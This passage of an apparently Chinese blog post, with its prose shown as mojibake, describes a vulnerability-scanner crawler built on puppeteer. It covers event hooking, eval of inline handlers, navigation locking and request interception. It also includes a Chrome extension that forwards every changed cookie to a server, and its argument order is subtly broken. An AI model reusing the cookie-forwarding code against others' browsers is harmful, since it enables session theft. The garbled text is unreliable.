ç–‘é—æ¼äº†å¾ˆå¤šURLã€‚è§£å†³è¿™äº›é—®é¢˜çš„å…³é”®åœ¨äºæ¨¡æ‹Ÿç”¨æˆ·æ“ä½œï¼Œè€Œç”¨æˆ·æ“ä½œçš„æœ¬è´¨åˆ™ä¸ºè§¦å‘å„ç§DOMäº‹ä»¶ã€‚æ‰€ä»¥æ¥ä¸‹æ¥éœ€è¦è§£å†³çš„é—®é¢˜åœ¨äºæ”¶é›†å„ç§DOMäº‹ä»¶ï¼Œä»¥åŠå»è§¦å‘å®ƒä»¬ã€‚</p><h3 id="æ”¶é›†DOMäº‹ä»¶"><a href="#æ”¶é›†DOMäº‹ä»¶" class="headerlink" title="æ”¶é›†DOMäº‹ä»¶"></a>æ”¶é›†DOMäº‹ä»¶</h3><p>åœ¨å­¦ä¹ æ”¶é›†DOMäº‹ä»¶çš„è¿‡ç¨‹ä¸­å‚è€ƒäº†<a href="https://www.anquanke.com/post/id/178339" target="_blank" rel="noopener">9ian1iå¸ˆå‚…</a>ä»¥åŠ<a href="https://blog.fatezero.org/2018/03/05/web-scanner-crawler-01/" target="_blank" rel="noopener">fate0å¸ˆå‚…</a>æ–‡ç« ï¼Œå¾ˆæ„Ÿè°¢å‰è¾ˆä»¬çš„æ‹“è’ã€‚</p><h4 id="Hookäº‹ä»¶"><a href="#Hookäº‹ä»¶" class="headerlink" title="Hookäº‹ä»¶"></a>Hookäº‹ä»¶</h4><p>æ³¨å†Œäº‹ä»¶åˆ†ä¸ºDOM0å’ŒDOM2äº‹ä»¶ï¼Œä½¿ç”¨æ–¹æ³•ä¸åŒï¼Œæ”¶é›†æ–¹æ³•ä¹Ÿæœ‰å·®å¼‚ã€‚è¿™é‡Œç®€å•ä»‹ç»äº†ä¸¤è€…çš„å·®å¼‚<a href="https://www.jianshu.com/p/b850978c2ee8" target="_blank" rel="noopener">DOM0çº§äº‹ä»¶å’ŒDOM2çº§äº‹ä»¶åŒºåˆ«</a>ã€‚ä»¥åŠ<a href="https://developer.mozilla.org/zh-CN/docs/Learn/JavaScript/Objects/Object_prototypes" target="_blank" rel="noopener">JavaScript Prototype Chain åŸå‹é“¾å­¦ä¹ </a><br><strong>DOM0</strong><br>å¯¹äºDOM0çš„äº‹ä»¶ç›‘å¬ï¼Œå¯ä»¥ä¿®æ”¹æ‰€æœ‰èŠ‚ç‚¹çš„ç›¸å…³å±æ€§åŸå‹ï¼Œè®¾ç½®å…¶è®¿é—®å™¨å±æ€§ã€‚<br>demo:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dom0Hook</span>(<span class="params">that, event_name</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"tagname: "</span> + that.tagName + <span class="string">", event_name:"</span> + event_name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Object</span>.defineProperties(HTMLElement.prototype, &#123;</span><br><span class="line">    onclick: &#123;<span class="attr">set</span>: <span class="function"><span class="keyword">function</span>(<span class="params">newValue</span>)</span>&#123;onclick = newValue;dom0Hook(<span class="keyword">this</span>, <span class="string">"click"</span>);&#125;&#125;,</span><br><span class="line">    onchange: &#123;<span class="attr">set</span>: <span class="function"><span class="keyword">function</span>(<span class="params">newValue</span>)</span>&#123;onchange = newValue;dom0Hook(<span class="keyword">this</span>, <span class="string">"change"</span>);&#125;&#125;</span><br><span class="line">&#125;);</span><br><span class="line">    $<span class="number">0</span> = <span class="built_in">document</span>.getElementsByTagName(<span class="string">"a"</span>);</span><br><span class="line">    $<span class="number">0</span>[<span class="number">0</span>].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">console</span>.log(<span class="string">"a"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/01/05/RaAdNwiHEPF2fom.jpg" alt="-w646"></p><p><strong>DOM2</strong><br>DOM2çº§äº‹ä»¶Hookï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹addEventListenerçš„åŸå‹å³å¯ï¼š<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> oldEvent = Element.prototype.addEventListener;</span><br><span class="line">Element.prototype.addEventListener = <span class="function"><span class="keyword">function</span>(<span class="params">event_name, event_func, useCapture</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"tagname: "</span> + <span class="keyword">this</span>.tagName + <span class="string">", event_name:"</span> + event_name);</span><br><span class="line">    oldEvent.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/01/05/dmCfy7lkevOHa6s.jpg" alt="-w722"></p><p><strong>å†…è”äº‹ä»¶</strong><br>é™¤äº†ä¸Šè¿°ä¸¤ç§ç»‘å®šäº‹ä»¶çš„åŠæ³•ï¼Œè¿˜æœ‰é€šè¿‡å†™åœ¨æ ‡ç­¾å†…çš„å†…è”äº‹ä»¶ï¼Œæ— æ³•é€šè¿‡Hookæ¥æ”¶é›†ã€‚æ¯”å¦‚ï¼š<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"test"</span> <span class="attr">onclick</span>=<span class="string">"alert('1')"</span>&gt;</span>123<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>è§£å†³åŠæ³•æ˜¯é€šè¿‡éå†èŠ‚ç‚¹ï¼Œæ‰§è¡Œonäº‹ä»¶ï¼š<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger_inline</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> nodes = <span class="built_in">document</span>.all;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; nodes.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> attrs = nodes[i].attributes;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; attrs.length; j++) &#123;</span><br><span class="line">            attr_name = attrs[j].nodeName;</span><br><span class="line">            attr_value = attrs[j].nodeValue;</span><br><span class="line">            <span class="keyword">if</span> (attr_name.substr(<span class="number">0</span>, <span class="number">2</span>) == <span class="string">"on"</span>) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(attrs[j].nodeName + <span class="string">' : '</span> + attr_value);</span><br><span class="line">                <span class="built_in">eval</span>(attr_value);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (attr_name <span class="keyword">in</span> &#123;<span class="string">"src"</span>: <span class="number">1</span>, <span class="string">"href"</span>: <span class="number">1</span>&#125; &amp;&amp; attrs[j].nodeValue.substr(<span class="number">0</span>, <span class="number">11</span>) == <span class="string">"javascript:"</span>) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(attrs[j].nodeName + <span class="string">' : '</span> + attr_value);</span><br><span class="line">                <span class="built_in">eval</span>(attr_value.substr(<span class="number">11</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/01/05/E8BT97cebUklidu.jpg" alt="-w1064"></p><blockquote><p>æˆ–è€…TreeWalkerè·å–å…¨éƒ¨èŠ‚ç‚¹ï¼Œç”¨<code>dispatchEvent</code>æŒ¨ä¸ªè§¦å‘äº‹ä»¶<br>è€ŒDOM0ã€DOM2çº§äº‹ä»¶é€šè¿‡æ”¶é›†åˆ°çš„æ ‡ç­¾å’Œäº‹ä»¶åä¾æ¬¡è§¦å‘å³å¯ã€‚</p></blockquote><h3 id="å¯¼èˆªé”å®š"><a href="#å¯¼èˆªé”å®š" class="headerlink" title="å¯¼èˆªé”å®š"></a>å¯¼èˆªé”å®š</h3><p>è§¦å‘äº‹ä»¶çš„è¿‡ç¨‹ä¸­ï¼Œå¯èƒ½ä¼šè¢«æ„å¤–çš„å¯¼èˆªè¯·æ±‚ç»™ä¸­æ–­æ“ä½œï¼Œæ‰€ä»¥æˆ‘ä»¬åº”å½“å–æ¶ˆéæœ¬é¡µé¢çš„å¯¼èˆªè¯·æ±‚ï¼Œé¿å…é€ æˆæ¼æŠ“ã€‚<br><strong>å‰ç«¯JSè·³è½¬</strong><br>å–æ¶ˆè·³è½¬æ“ä½œï¼Œè®°å½•è·³è½¬URLï¼Œä½†æ˜¯Chromeä¸å…è®¸æˆ‘ä»¬é€šè¿‡<code>Object.defineProperty</code>é‡å®šä¹‰<code>window.Location</code>æ“ä½œï¼Œå³æ— æ³•é€šè¿‡Hookè·å–è·³è½¬çš„URLã€‚<br><img src="https://i.loli.net/2020/01/05/meiza4wDHx9jo1G.jpg" alt="-w705"></p><p>æœç´¢äº†ä¸€äº›èµ„æ–™ä¹‹åå¤§è‡´æœ‰ä¸‹è¾¹ä¸€äº›è§£å†³åŠæ³•ï¼š</p><ul><li><a href="https://blog.fatezero.org/2018/03/05/web-scanner-crawler-01/" target="_blank" rel="noopener">ä¿®æ”¹Chromiumé»˜è®¤locationå±æ€§çš„configurableä¸ºtrue</a></li><li>åŠ è½½è‡ªå®šä¹‰æ’ä»¶</li><li>ä½¿ç”¨puppeteerçš„æ‹¦æˆªå™¨è¿”å›204çŠ¶æ€ç </li></ul><p>ä½†æœ€åæˆ‘é€‰æ‹©äº†<a href="https://github.com/myvyang/chromium_for_spider" target="_blank" rel="noopener">ä¸ºæ¼æ‰«åŠ¨æ€çˆ¬è™«å®šåˆ¶çš„æµè§ˆå™¨</a>ï¼Œåè¾¹ä¼šç»†è¯´ã€‚</p><p><strong>åç«¯è·³è½¬</strong><br>è¯·æ±‚ä½“æ— å†…å®¹ï¼Œåˆ™è·Ÿè¿›ï¼›è¯·æ±‚ä½“æœ‰å†…å®¹ï¼Œåˆ™æ¸²æŸ“é¡µé¢ï¼Œè®°å½•è·³è½¬urlã€‚</p><h3 id="è¡¨å•å¡«å……"><a href="#è¡¨å•å¡«å……" class="headerlink" title="è¡¨å•å¡«å……"></a>è¡¨å•å¡«å……</h3><p><strong>é”å®šé‡ç½®è¡¨å•äº‹ä»¶</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTMLFormElement.prototype.reset = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"cancel reset form"</span>)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(HTMLFormElement.prototype, <span class="string">"reset"</span>, &#123;<span class="string">"writable"</span>: <span class="literal">false</span>, <span class="string">"configurable"</span>: <span class="literal">false</span>&#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p><blockquote><p>æŒ–å‘</p></blockquote><h3 id="ä¸ºæ¼æ‰«åŠ¨æ€çˆ¬è™«å®šåˆ¶çš„æµè§ˆå™¨"><a href="#ä¸ºæ¼æ‰«åŠ¨æ€çˆ¬è™«å®šåˆ¶çš„æµè§ˆå™¨" class="headerlink" title="ä¸ºæ¼æ‰«åŠ¨æ€çˆ¬è™«å®šåˆ¶çš„æµè§ˆå™¨"></a>ä¸ºæ¼æ‰«åŠ¨æ€çˆ¬è™«å®šåˆ¶çš„æµè§ˆå™¨</h3><p>è§£å†³è¿™ä¸ªå‰ç«¯å¯¼èˆªhooké—®é¢˜çš„æ—¶å€™ï¼Œå‘ç°githubä¸Šæœ‰ä¸€ä¸ªå¤§ç‰›é€šè¿‡ä¿®æ”¹æºç å®ç°äº†ä¸€ä¸ª<a href="https://github.com/myvyang/chromium_for_spider" target="_blank" rel="noopener">ä¸ºæ¼æ‰«å®šåˆ¶ç‰ˆçš„Chrome</a>ã€‚ä½œè€…é€šè¿‡ä¿®æ”¹chromiumæºç å®ç°äº†å¯¼èˆªçš„Hookï¼Œç¦æ­¢é¡µé¢çš„å¤©é”»è·³è½¬å¹¶æ”¶é›†å…¶è·³è½¬çš„URLï¼Œå¹¶ä¸”é€šè¿‡åº•å±‚hookäº†æ‰€æœ‰éé»˜è®¤äº‹ä»¶ï¼Œä¸ºæˆ‘ä»¬å¼€å‘æä¾›äº†å¾ˆå¤šä¾¿åˆ©ã€‚</p><p>ä½†è¿˜æ˜¯æœ‰ä¸€äº›å°çš„åœ°æ–¹éœ€è¦æˆ‘ä»¬è‡ªå·±ä¼˜åŒ–ä¸€ä¸‹ï¼Œä¼šé”å®šå¯¼èˆªè‡ªåŠ¨æ”¶é›†å‰ç«¯è·³è½¬URLï¼Œä½†ä¸ä¼šå¤„ç†åç«¯çš„Locationï¼Œè¿™é‡Œæˆ‘ä»¬ç”¨ä¸€ä¸ªæ‹¦æˆªå™¨å»å®ç°ï¼Œè®°å½•åç«¯è·³è½¬ï¼ŒåŠ å…¥æ‰«æé˜Ÿåˆ—ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> page.on(<span class="string">'response'</span>, interceptedResponse =&gt;&#123;</span><br><span class="line">    <span class="keyword">let</span> status = interceptedResponse.status();</span><br><span class="line">    <span class="keyword">if</span>(status.toString().substr(<span class="number">0</span>,<span class="number">2</span>) === <span class="string">"30"</span>)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"url: "</span> + interceptedResponse.url());</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"status: "</span> + status);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"headers: "</span> + interceptedResponse.headers().location);</span><br><span class="line">        <span class="comment">// æ·»åŠ è¿›ä»»åŠ¡é˜Ÿåˆ—</span></span><br><span class="line">        cluster.queue(interceptedResponse.headers().location);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><strong>äº‹ä»¶è§¦å‘&amp;æ”¶é›†ç»“æœ</strong><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">executeEvent</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> firedEventNames = [<span class="string">"focus"</span>, <span class="string">"mouseover"</span>, <span class="string">"mousedown"</span>, <span class="string">"click"</span>, <span class="string">"error"</span>];</span><br><span class="line">    <span class="keyword">var</span> firedEvents = &#123;&#125;;</span><br><span class="line">    <span class="keyword">var</span> length = firedEventNames.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">        firedEvents[firedEventNames[i]] = <span class="built_in">document</span>.createEvent(<span class="string">"HTMLEvents"</span>);</span><br><span class="line">        firedEvents[firedEventNames[i]].initEvent(firedEventNames[i], <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> eventLength = <span class="built_in">window</span>.eventNames.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; eventLength; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> eventName =  <span class="built_in">window</span>.eventNames[i].split(<span class="string">"_-_"</span>)[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">var</span> eventNode =  <span class="built_in">window</span>.eventNodes[i];</span><br><span class="line">        <span class="keyword">var</span> index = firedEventNames.indexOf(eventName);</span><br><span class="line">        <span class="keyword">if</span> (index &gt; <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (eventNode != <span class="literal">undefined</span>) &#123;</span><br><span class="line">                eventNode.dispatchEvent(firedEvents[eventName]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> result = <span class="built_in">window</span>.info.split(<span class="string">"_-_"</span>);</span><br><span class="line">    result.splice(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/01/05/1GeoYZhqvTsix7Q.jpg" alt="-w1679"></p><h3 id="æ·»åŠ cookie"><a href="#æ·»åŠ cookie" class="headerlink" title="æ·»åŠ cookie"></a>æ·»åŠ cookie</h3><p>å¯¹äºä½¿ç”¨SSOå•ç‚¹ç«™ç‚¹ä½“ç³»è€Œè¨€ï¼Œå¯ä»¥åœ¨å¼€å§‹çˆ¬è¡Œä¹‹å‰æŒ‡å®šä¸€æ®µcookieï¼Œæ¯”å¦‚ä»æ–‡æœ¬ä¸­è¯»å–ã€‚ä½†æ˜¯å¯¹äºçˆ¬è¡Œç›®æ ‡è¾ƒä¸ºå¤šä¸”SSOçš„è¦†ç›–é¢æœ‰é™çš„æƒ…å†µä¸‹ï¼Œå°±å¾—ä½¿ç”¨æ•°æ®åº“äº†ã€‚åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­é‡åˆ°äº†å¦ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯å¹¶å‘è¿‡é«˜ï¼Œæˆ–è€…å‘é€æœ‰å®³çš„payloadï¼Œä¼šæœ‰Cookieå¤±æ•ˆçš„é—®é¢˜ï¼Œè¿™é‡Œæƒ³åˆ°äº†ä¸€ç§æ¯”è¾ƒå®ç”¨çš„è§£å†³åŠæ³•ï¼Œå†™ä¸€ä¸ªæµè§ˆå™¨æ’ä»¶åŠæ—¶å°†å½“å‰é¡µé¢çš„cookieåŒæ­¥åˆ°æœåŠ¡ç«¯æ•°æ®åº“ï¼Œç„¶åçˆ¬è™«å®šæœŸä»æ•°æ®åº“ä¸­æ›´æ–°æœ€æ–°çš„cookieã€‚</p><p><strong>Chromeæ’ä»¶åŒæ­¥cookie</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateCookie</span>(<span class="params">domain, name , value</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> api = <span class="string">"https://127.0.0.1/add-cookie"</span>;</span><br><span class="line">    $.post(api, &#123;</span><br><span class="line">        <span class="string">"domain"</span>: domain,</span><br><span class="line">        <span class="string">"name"</span>: name,</span><br><span class="line">        <span class="string">"value"</span>: value,</span><br><span class="line">    &#125;, <span class="function"><span class="keyword">function</span> (<span class="params">data, status</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(status);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * doc: https://developer.chrome.com/extensions/cookies</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">chrome.cookies.onChanged.addListener(<span class="function">(<span class="params">changeInfo</span>) =&gt;</span>&#123;</span><br><span class="line">    <span class="comment">// è®°å½•Cookieå¢åŠ ï¼ŒCookieæ›´æ–°åˆ†ä¸¤æ­¥ï¼Œç¬¬ä¸€æ­¥å…ˆåˆ é™¤ï¼Œç¬¬äºŒæ­¥å†å¢åŠ </span></span><br><span class="line">    <span class="keyword">if</span>(changeInfo.removed === <span class="literal">false</span>)&#123;</span><br><span class="line">        updateCookie(changeInfo.cookie.name, changeInfo.cookie.value, changeInfo.cookie.domain);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h3 id="ç›¸ä¼¼URLå»é‡"><a href="#ç›¸ä¼¼URLå»é‡" class="headerlink" title="ç›¸ä¼¼URLå»é‡"></a>ç›¸ä¼¼URLå»é‡</h3><p>å»é‡åœ¨çˆ¬è™«ä¸­æ˜¯ä¸€ä¸ªè¾ƒä¸ºæ ¸å¿ƒåŠŸèƒ½ï¼Œè§„åˆ™è¿‡äºå®½æ¾å¯èƒ½å¯¼è‡´çˆ¬è¡Œä¸å®Œæˆ–è€…è¯´åšä¸€äº›æ— æ„ä¹‰çš„é‡å¤çˆ¬è¡Œï¼Œè§„åˆ™è¿‡äºä¸¥æ ¼åˆ™å¯èƒ½å¯¼è‡´æŠ“å–ç»“æœè¿‡å°‘ï¼Œå½±å“åç»­æŠ“å–å’Œæ¼æ´æ£€æµ‹ã€‚å»é‡ä¸€èˆ¬åˆ†ä¸ºä¸¤æ­¥å¯¹çˆ¬è¡Œé˜Ÿåˆ—å»é‡ï¼Œæˆ–è€…å¯¹ç»“æœé›†å»é‡ã€‚</p><p>åœ¨è§£å†³è¿™ä¸ªé—®é¢˜çš„æ—¶å€™ï¼Œå‚è€ƒäº†Fr1dayå¸ˆå‚…<a href="https://www.anquanke.com/post/id/85298" target="_blank" rel="noopener">ã€æŠ€æœ¯åˆ†äº«ã€‘æµ…è°ˆåŠ¨æ€çˆ¬è™«ä¸å»é‡</a>çš„URLå»é‡æ€è·¯ã€‚ä¸å¤±ä¸ºä¸€ç§æ¯”è¾ƒä¾¿æ·ï¼Œèƒ½åŸºæœ¬æ»¡è¶³å½“å‰éœ€æ±‚çš„ä¸€ç§è§£å†³åŠæ³•ã€‚</p><p><strong>å‚æ•°åˆ†æ</strong><br>å¤§è‡´æœ‰ä»¥ä¸‹å‡ ç§å‚æ•°ï¼šç±»å‹intã€hashã€ä¸­æ–‡ã€URLç¼–ç <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?m=home&amp;c=index&amp;a=index</span><br><span class="line">?type=202cb962ac59075b964b07152d234b70</span><br><span class="line">?id=1</span><br><span class="line">?msg=%E6%B6%88%E6%81%AF</span><br></pre></td></tr></table></figure></p><p>æ ¹æ®ä¸åŒçš„ç±»å‹å¯¹å…¶è¿›è¡Œå¤„ç†ï¼š</p><ol><li>çº¯å­—æ¯ï¼šä¸­å‚æ•°çš„å€¼è¡¨ç¤ºä¸åŒçš„è·¯ç”±åŠŸèƒ½ï¼Œéœ€è¦å¯¹è¿™ç§å‚æ•°è¿›è¡Œä¿ç•™</li><li>å­—æ¯æ•°å­—æ··åˆï¼šå¯èƒ½æ˜¯ç”¨æˆ·çš„hashï¼Œä¹Ÿå¯èƒ½å…·æœ‰è·¯ç”±åŠŸèƒ½ï¼Œå¯æ ¹æ®ä»»åŠ¡é‡æƒ…å†µé€‰æ‹©æ€§ä¿ç•™</li><li>çº¯æ•°å­—ã€URlç¼–ç ï¼šè¿›è¡Œå»é‡</li></ol><p>å¤„ç†ç»“æœå³ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?m=home&amp;c=index&amp;a=index</span><br><span class="line">?type=&#123;hash&#125;</span><br><span class="line">?id=&#123;int&#125;</span><br><span class="line">?msg=&#123;urlencode&#125;</span><br></pre></td></tr></table></figure></p><p>ç„¶ååœ¨æ•°æ®åº“ä¸­å°†ç›¸åŒçš„æ¸…æ´—æ‰å³å¯ã€‚</p><h3 id="ç›¸ä¼¼é¡µé¢å»é‡"><a href="#ç›¸ä¼¼é¡µé¢å»é‡" class="headerlink" title="ç›¸ä¼¼é¡µé¢å»é‡"></a>ç›¸ä¼¼é¡µé¢å»é‡</h3><p>ç›¸ä¼¼åº¦è®¡ç®—ï¼Œç›‘æ§èµ„äº§å˜åŒ–<br>ç½‘é¡µç»“æ„ç›¸ä¼¼åº¦:<a href="https://xueshu.baidu.com/usercenter/paper/show?paperid=232b0da253211ecf9e2c85cb513d0bd3&amp;site=xueshu_se" target="_blank" rel="noopener">https://xueshu.baidu.com/usercenter/paper/show?paperid=232b0da253211ecf9e2c85cb513d0bd3&amp;site=xueshu_se</a></p><blockquote><p>æŒ–å‘</p></blockquote><h2 id="æ€§èƒ½ä¼˜åŒ–"><a href="#æ€§èƒ½ä¼˜åŒ–" class="headerlink" title="æ€§èƒ½ä¼˜åŒ–"></a>æ€§èƒ½ä¼˜åŒ–</h2><h3 id="å›¾ç‰‡èµ„æºä¼˜åŒ–"><a href="#å›¾ç‰‡èµ„æºä¼˜åŒ–" class="headerlink" title="å›¾ç‰‡èµ„æºä¼˜åŒ–"></a>å›¾ç‰‡èµ„æºä¼˜åŒ–</h3><p>ç¦æ­¢æµè§ˆå™¨åŠ è½½å›¾ç‰‡ =&gt; è¿”å›ä¸€ä¸ªfake img<br>å®é™…æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œæœ‰çš„ç½‘ç«™åœ¨åŠ è½½å›¾ç‰‡å¤±è´¥åï¼Œä¼šå°è¯•é‡æ–°åŠ è½½ï¼Œè¿™æ ·ä¼šé™·å…¥ä¸€ä¸ªæ­»å¾ªç¯ï¼Œå¯¼è‡´å‘é€å¤§é‡æ•°æ®åŒ…ï¼Œå ç”¨æ€§èƒ½ã€‚<br><img src="https://i.loli.net/2020/01/05/HIsrhXxkKeNiLGY.jpg" alt="-w598"></p><p><img src="https://i.loli.net/2020/01/05/wmfDyBQ2UZM7CI6.jpg" alt="-w1679"><br>ä»£ç ï¼š<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.launch(launchOptions);</span><br><span class="line"><span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line"><span class="keyword">await</span> preparePage(page);</span><br><span class="line"><span class="keyword">await</span> page.setRequestInterception(<span class="literal">true</span>);     <span class="comment">// å¼€å¯æ‹¦æˆªåŠŸèƒ½</span></span><br><span class="line"><span class="keyword">await</span> page.on(<span class="string">'request'</span>, interceptedRequest =&gt; &#123;</span><br><span class="line">    <span class="comment">// æ‹¦æˆªå›¾ç‰‡è¯·æ±‚</span></span><br><span class="line">    <span class="keyword">if</span> (interceptedRequest.resourceType() === <span class="string">'image'</span> || interceptedRequest.url().endsWith(<span class="string">'.ico'</span>)) &#123;</span><br><span class="line">        <span class="comment">//console.log(`abort image: $&#123;interceptedRequest.url()&#125;`);</span></span><br><span class="line">        <span class="keyword">let</span> images = fs.readFileSync(<span class="string">'public/image.png'</span>);</span><br><span class="line">        interceptedRequest.respond(&#123;</span><br><span class="line">            <span class="string">'contentType'</span>: <span class="string">' image/png'</span>,</span><br><span class="line">            <span class="string">'body'</span>: Buffer.from(images)</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        interceptedRequest.continue();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><h3 id="æ‹¦æˆªlogoutè¯·æ±‚"><a href="#æ‹¦æˆªlogoutè¯·æ±‚" class="headerlink" 